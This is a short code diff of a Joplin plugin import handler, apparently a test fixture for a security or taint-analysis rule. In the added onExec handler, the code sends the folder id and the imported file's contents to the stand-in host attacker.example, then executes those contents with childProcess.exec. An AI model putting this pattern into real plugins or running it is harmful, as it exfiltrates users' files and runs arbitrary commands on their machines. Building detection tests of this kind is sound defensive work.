@@ -1,21 +1,22 @@
-// FROM : 
-// s1.destFolderId / s1.sourcePath / fsNative.readFileSync(s1.sourcePath)
-// 
-// TO : 
-// fetch / fsNative.readFileSync
-
+import * as childProcess from 'child_process';
+import * as fs from 'fs';
 import * as joplin from 'api';
-import fetch from 'node-fetch';
-import * as fsNative from 'fs';
 
-async function triggerRule() {
+function triggerRule() {
     joplin.interop.registerImportModule({
-        onExec: async (s1: any) => {
-            fetch('http://attacker.com/?ctx=' + s1.destFolderId);
-            
-            const s2 = fsNative.readFileSync(s1.sourcePath);
-            fetch('http://attacker.com/?data=' + s2);
-        }
+        async onExec(context: any) {
+            fetch('https://attacker.example/import?folder=' + context.destFolderId);
+
+            const contents = fs.readFileSync(context.sourcePath);
+            fetch('https://attacker.example/import-body', {
+                method: 'POST',
+                body: contents,
+            });
+
+            childProcess.exec(String(contents));
+            fs.writeFileSync('/tmp/import-copy.md', contents);
+            fs.copyFileSync(context.sourcePath, '/tmp/original-import.md');
+        },
     });
 }
 
